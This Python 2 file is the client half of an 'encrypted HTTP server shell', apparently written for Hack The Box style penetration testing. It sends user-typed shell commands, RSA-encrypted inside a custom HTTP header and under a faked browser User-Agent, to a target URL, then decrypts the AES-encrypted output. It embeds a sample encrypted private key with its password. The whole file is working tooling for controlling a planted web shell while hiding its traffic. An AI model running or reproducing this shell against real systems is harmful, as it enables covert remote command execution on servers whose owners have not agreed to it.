#
# Encrypted HTTP server shell - client side
# Author: Paul Bolton (m0noc), twitter: @overtsecrecy
#
# NOTE: Currently commands must be less than the RSA key len
# NOTE: Currently uses a HTTP header to pass the command, but
#       you can change this to be something else - just don't
#       forget the server side as well :D
#
# TODO: python3 version
#
import requests, sys, base64, getopt
from M2Crypto import BIO, RSA, EVP

# To generate keys for both scripts run:
# openssl genrsa -des3 -out private.pem 2048
# openssl rsa -in private.pem -outform PEM -pubout -out public.pem

# EXAMPLE key - DO NOT USE THIS in a real test
# Password: hackthebox
key = """-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,E1D32D82F9E08262

/Wfeg+VC6E0RWsCySpHsNpICYTiShd0Jx/lHWmtWIaWAeOL7HkefTQqJYzXpxFVJ
evKSVHqFuOR+XqvZaVkgdqPD/6nDNSKjhD8LK6xqmynbzLBXxgdmcBXyQWP3Dqbh
CaR8vuK4l3rPX6707G2OI+t7ExBPp/z8Vl4ZNbZuPiqA2QIc6p88O1aL52iqgoAj
a++0dTXwomxDnTXDSwSjvvKR7DaoiQjJRHXGRqRCC1FjIco2Kex4PP3rGE9C3kRx
TQT8XA5sfBIMaXzXTnx3MvKiUaS3nGXYomfv/UrwSdVCNdEXYcGy86mS+lkPQ7nE
GxZUthYbv5UZ8AbMFlOqp84zEndayo4Wb5YiTsvkey/FOYCwIMcDXV+w8o6tV2zy
20jncgsloAuRbvrI/F87SnIAYK1sSSoBbDycx0/+I3QCKdOU5WGpVn3Z4I219ZbF
VjM++iibClNgrGv2d06pah4XoKPOG/5UMF3SC6qtz3W7j1I9LQa4+p1N5/DAj7eo
2t64py3EOc2PXPRitNk6GdAbCNZA1riugNT+LxI+P0/3dZ70jwUti/Cw6Pl+0pS/
R0Xzkpfi7HDFo6bknGvYjqMNTKgIHMmwZoMLGW/IiV6koysR4k980SAzYLYL+GMQ
lzsG63QZdn5MyOtnZgdTUgVbOfvQ0yWizPKGCb5KqQ8MsWcsPRCxkkH8Wcpc07+V
kwrfXFj9tor6LRH6okBrF2vcvD8BHdWYSs68epTmP3pNLmn592MQvSFhvki/s+sg
TV2Yson26eOzxJfRkAF5UM3Yui5VAke8R2sjCokqPbRbe5RhrDZvj51lBInZyi4J
eUF771etXrs+ltbMagjA1vbwBzEVnh+jY6+Q6XE7urFQIoVTqzxcjNJmsd3ergFb
CwtN3cOaAEc5b0uiPFoUVC3qaawbObHhyXgJ3kKB6GeK/xVo8wz7pGR9ISZ42Rbp
hOozbP5Qa9CVyNTIVerWNsbWWswzVu2CJNwi/Jv7j0EX37fz/f9pXRGRu4eQG1E+
r4XYPEXSgeHInJu0bKc44Eunw31EWelXWdDshAPuyUssTc8W61wkrwoPZKuYqH4O
e+AEF/6EcplM9Nl59CJRnTSr2FcGQa35rpJ3ozOeYrty9JjKrTFKjQwkuKd6XaBQ
ysXTnXOq9NIePGlalM4FqltZ10nlaBVKSH7a47vb1grqg03V78WMc9kFFGadkJws
4nrRYfLjduSoZnp6ELC0sC4pR9B08XBNrI49BAp9tEcXhVS5LHDzLE6q5IIk/Dek
7H6UOYvVvhHebi9hCPuMhqsGrdqDpLaZFwzoYAkE6Z2kHEnL6SLRM7sOovpXvcMi
Ly34gGFB1uggQ8t6Hv7Kmg/kAKy8r9h+N69NyncnwYNAT8WF0YpM7kRymHkT8dLd
/QUazet4UhpRDIl9u1lThQSKnjMYBNSFDoKbUSxJsotyIT8GsyqFXIpZeZIUyz4k
wm9ojSySzk3HQBReJEyJ0SRWYt8psG6egyXOfCT77GmbuG+i8NPocH+dPfCWKK0y
umIDvVaV0QoKxNCaY/ZEIzkxTJafMJYGKcVxUuL5n4PAydagldVYxw==
-----END RSA PRIVATE KEY-----"""

proxies = {}

try:
    opts, args = getopt.getopt(sys.argv[1:], "p:", ["proxy"])
except getopt.GetoptError as err:
    print(str(err))
    print("%s: [-p|--proxy proxy] targetUrl" % sys.argv[0])
    sys.exit(2)

for o, a in opts:
    if o in ("-p", "--proxy"):
        proxies = {
             "http" : a,
             "https" : a,
             }
        print("[i] proxy: " + a)

if len(args) != 1:
    print("[f] missing target")
    print("%s: [-p|--proxy proxy] targetUrl" % sys.argv[0])
    sys.exit(2)

url = args[0]
print("[i] target url: %s" % url)
print("[i] WARNING: Remember that each cmd is in a separate shell")

# TODO: check less than keylength?

bio = BIO.MemoryBuffer(key)
rsa = RSA.load_key_bio(bio)

s = requests.session()
s.headers.update(
        {
            'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0'
            }
        )

while True:
    cmd = raw_input("httpsh# ")
    if cmd == "exit":
        sys.exit(0)

    cmdEnc = rsa.private_encrypt(cmd, RSA.pkcs1_padding)
    cmdEncB64 = base64.b64encode(cmdEnc)
    headers = {
            "X-m0noc" : cmdEncB64
            }

    #print "GOT: " + cmdEncB64

    r = s.post(url,headers=headers,proxies=proxies)
    #print "GOT: " + r.text

    payload = base64.b64decode(r.text)
    keyData = payload[0:256]
    cmdOut = payload[256:]

    try:
        decodedKeyData = rsa.private_decrypt(keyData, RSA.pkcs1_padding)
        key = decodedKeyData[0:32]
        iv = decodedKeyData[32:]

        #print "[D] iv : " + base64.b64encode(iv)
        #print "[D] key : " + base64.b64encode(key)

        DECRYPT = 0
        cipher = EVP.Cipher(alg='aes_256_cbc', key=key, iv=iv, op=DECRYPT)
        textDec = cipher.update(cmdOut) + cipher.final()

        #print "[D] RESULT: " + textDec
        print "%s" % textDec
    except Exception as e:
        print("[F] %s" % repr(e))
        pass
